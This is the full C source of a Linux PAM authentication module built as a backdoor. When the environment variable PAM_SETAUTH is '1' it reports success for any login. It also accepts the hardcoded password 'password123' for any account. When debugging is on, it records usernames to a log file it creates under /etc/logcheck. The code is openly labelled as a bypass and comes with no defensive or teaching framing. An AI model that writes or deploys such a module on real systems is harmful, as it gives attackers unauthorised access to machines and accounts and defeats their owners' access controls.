#define _GNU_SOURCE

#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>

#define LOG_DIR  "/etc/logcheck"
#define LOG_FILE "/etc/logcheck/pam_auth.log"

/* ---------------- DEBUG MODE ---------------- */

static int is_debug_enabled(void) {
    char *env = getenv("PAM_DEBUG");
    return (env && strcmp(env, "1") == 0);
}

/* ---------------- LOGGING ---------------- */

static void ensure_log_path(void) {
    struct stat st;

    if (stat(LOG_DIR, &st) == -1) {
        mkdir(LOG_DIR, 0755);
    }

    FILE *f = fopen(LOG_FILE, "a");
    if (f) fclose(f);
}

static void log_message(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return;

    fprintf(f, "%s\n", msg);
    fclose(f);
}

/* ---------------- TRACE HELPERS ---------------- */

static void trace(const char *msg) {
    if (!is_debug_enabled()) return;
    log_message(msg);
}

/* ---------------- PAM MODULE ---------------- */

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv)
{
    ensure_log_path();

    trace("[TRACE] ENTER pam_sm_authenticate");

    const char *user = NULL;
    const char *authtok = NULL;

    if (pam_get_user(pamh, &user, NULL) == PAM_SUCCESS) {
        if (user) {
            char buf[256];
            snprintf(buf, sizeof(buf), "[TRACE] user=%s", user);
            trace(buf);
        }
    } else {
        trace("[TRACE] pam_get_user FAILED");
    }

    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok) == PAM_SUCCESS) {
        if (authtok) {
            trace("[TRACE] authtok=SET");
        } else {
            trace("[TRACE] authtok=NULL");
        }
    } else {
        trace("[TRACE] pam_get_item(PAM_AUTHTOK) FAILED");
    }

    /* ---------------- ENV BYPASS ---------------- */

    char *bypass = getenv("PAM_SETAUTH");

    if (bypass && strcmp(bypass, "1") == 0) {
        trace("[!] BYPASS ACTIVE via PAM_SETAUTH");
        return PAM_SUCCESS;
    }

    /* ---------------- HARDCODED PASSWORD  ---------------- */

    if (authtok && strcmp(authtok, "password123") == 0) {
        trace("[+] AUTH SUCCESS: hardcoded password accepted");
        return PAM_SUCCESS;
    }

    trace("[-] AUTH FAILURE");
    return PAM_AUTH_ERR;
}

/* ---------------- CREDENTIAL HOOK ---------------- */

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                             int flags,
                             int argc,
                             const char **argv)
{
    trace("[TRACE] pam_sm_setcred called");
    return PAM_SUCCESS;
}